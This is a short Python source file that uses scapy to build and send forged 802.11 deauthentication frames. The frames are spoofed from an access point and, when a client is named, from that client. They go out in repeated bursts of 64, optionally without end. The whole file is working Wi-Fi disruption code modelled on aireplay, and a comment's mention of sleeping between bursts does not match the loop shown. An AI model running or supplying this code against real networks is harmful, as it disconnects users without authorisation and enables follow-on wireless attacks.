from scapy.all import Dot11, RadioTap, Dot11Deauth, Dot11Elt, Dot11Beacon, Dot11ProbeResp  # escape ide warning
from scapy.all import *
import logging
logging.getLogger("scapy.runtime").setLevel(logging.INFO)


class Deauthentication:
    def __init__(self):
        pass

    @staticmethod
    def send(bssid, client, count):
        pckt = Dot11(addr1=client, addr2=bssid, addr3=bssid) / Dot11Deauth()
        cli_to_ap_pckt = None
        if client != 'FF:FF:FF:FF:FF:FF':
            cli_to_ap_pckt = Dot11(addr1=bssid, addr2=client, addr3=bssid) / Dot11Deauth()
        print('\rSending Deauth to ' + client + ' from ' + bssid, end='')
        if not count:
            print('Press CTRL+C to quit')
        # We will do like aireplay does and send the packets in bursts of 64, then sleep for half a sec or so
        while count != 0:
            try:
                for i in range(64):
                    send(pckt)  # Send out deauth from the AP
                    # If we're targeting a client, we will also spoof deauth from the client to the AP
                    if client != 'FF:FF:FF:FF:FF:FF':
                        send(cli_to_ap_pckt)
                # If count was -1, this will be an infinite loop
                count -= 1
            except KeyboardInterrupt:
                break
